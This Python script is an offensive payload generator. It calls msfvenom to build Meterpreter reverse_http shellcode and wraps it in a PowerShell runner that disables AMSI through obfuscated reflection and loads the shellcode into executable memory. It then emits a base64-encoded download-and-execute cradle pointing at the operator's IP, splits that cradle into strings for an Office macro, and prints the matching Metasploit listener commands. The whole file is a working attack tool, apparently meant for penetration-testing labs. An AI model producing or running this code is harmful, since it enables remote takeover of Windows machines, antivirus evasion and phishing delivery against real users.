import hashlib
import subprocess
import netifaces as ni
import base64

def get_ip_address(interface_name):
    try:
        return ni.ifaddresses(interface_name)[ni.AF_INET][0]['addr']
    except KeyError:
        print(f"Error: Could not find IP address for interface {interface_name}.")
        return None

def run_msfvenom(arch):
    payload = 'windows/x64/meterpreter/reverse_http' if arch == 64 else 'windows/meterpreter/reverse_http'
    try:
        # Run msfvenom command
        result = subprocess.run(
            ['msfvenom', '-p', payload, 'LHOST=tun0', 'LPORT=443', 'EXITFUNC=thread', '-f', 'powershell'],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error running msfvenom: {e.stderr}")
        return None

def create_runner_file(msfvenom_output, filename, arch):
    # Full template
    template = (
        "# Compact 4MSI bypass\n"
        "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)\n\n"
        "# Shellcode loader >:]\n"
        "function LookupFunc {\n"
        "    Param ($moduleName, $functionName)\n"
        "    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |\n"
        "    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].\n"
        "    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n"
        "    $tmp=@()\n"
        "    $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n"
        "    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,\n"
        "    @($moduleName)), $functionName))\n"
        "}\n\n"
        "function getDelegateType {\n"
        "    Param (\n"
        "    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,\n"
        "    [Parameter(Position = 1)] [Type] $delType = [Void]\n"
        "    )\n"
        "    $type = [AppDomain]::CurrentDomain.\n"
        "    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),\n"
        "    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n"
        "    DefineDynamicModule('InMemoryModule', $false).\n"
        "    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n"
        "    [System.MulticastDelegate])\n"
        "    $type.\n"
        "    DefineConstructor('RTSpecialName, HideBySig, Public',\n"
        "    [System.Reflection.CallingConventions]::Standard, $func).\n"
        "    SetImplementationFlags('Runtime, Managed')\n"
        "    $type.\n"
        "    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).\n"
        "    SetImplementationFlags('Runtime, Managed')\n"
        "    return $type.CreateType()\n"
        "}\n\n"
        "# Allocate executable memory\n"
        "$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), \n"
        "  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)\n\n"
        "# Copy shellcode to allocated memory\n"
        "# msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell\n"
        f"{msfvenom_output}\n\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)\n\n"
        "# Execute shellcode and wait for it to exit\n"
        "$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),\n"
        "  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)\n"
        "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),\n"
        "  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)"
    )

    # Write the content to the file
    with open(filename, 'w') as file:
        file.write(template)
    arch_text = '64-bit' if arch == 64 else '32-bit'
    print(f"\n\033[92m[+]\033[0m {arch_text} shellcode successfully written to {filename}")

def run_powershell_commands(ip_address, filename):
    text = f"(New-Object System.Net.WebClient).DownloadString('http://{ip_address}/{filename}') | IEX"
    bytes = text.encode('utf-16le')
    encoded_text = base64.b64encode(bytes).decode()
    return encoded_text

def split(input_string, n=50):
    for i in range(0, len(input_string), n):
        print(f"Str = Str + \"{input_string[i:i+n]}\"")

def get_md5_checksum(input_string):
    md5_hash = hashlib.md5()
    md5_hash.update(input_string.encode())
    return md5_hash.hexdigest()

if __name__ == "__main__":
    ip_address = get_ip_address('tun0')
    if ip_address:
        # Generate and write 64-bit payload
        msfvenom_output_64 = run_msfvenom(64)
        if msfvenom_output_64:
            create_runner_file(msfvenom_output_64, "run_64.txt", 64)
            encoded_command_64 = run_powershell_commands(ip_address, "run_64.txt")
            print(f"\033[92m[+]\033[0m 64-bit cradle: powershell -e {encoded_command_64}")
            md5_checksum = get_md5_checksum(encoded_command_64)
            print(f"\033[92m[+]\033[0m MD5 fingerprint: {md5_checksum}")
            print(f"\033[92m[+]\033[0m 64-bit macro:")
            split(f"powershell -e {encoded_command_64.strip()}")
            print("\033[92m[+]\033[0m 64-bit listener:\nmsfconsole -q -x 'color true; \\")
            print("use exploit/multi/handler; \\")
            print("set payload windows/x64/meterpreter/reverse_http; \\")
            print("set LHOST tun0; \\")
            print("set LPORT 443; \\")
            print("set EXITFUNC thread; \\")
            print("run;'\n")
        
        # Generate and write 32-bit payload
        msfvenom_output_32 = run_msfvenom(32)
        if msfvenom_output_32:
            create_runner_file(msfvenom_output_32, "run_32.txt", 32)
            encoded_command_32 = run_powershell_commands(ip_address, "run_32.txt")
            print(f"\033[92m[+]\033[0m 32-bit cradle: powershell -e {encoded_command_32}")
            md5_checksum = get_md5_checksum(encoded_command_32)
            print(f"\033[92m[+]\033[0m MD5 fingerprint: {md5_checksum}")
            print(f"\033[92m[+]\033[0m 32-bit macro:")
            split(f"powershell -e {encoded_command_32.strip()}")
            print("\033[92m[+]\033[0m 32-bit listener:\nmsfconsole -q -x 'color true; \\")
            print("use exploit/multi/handler; \\")
            print("set payload windows/meterpreter/reverse_http; \\")
            print("set LHOST tun0; \\")
            print("set LPORT 443; \\")
            print("set EXITFUNC thread; \\")
            print("run;'")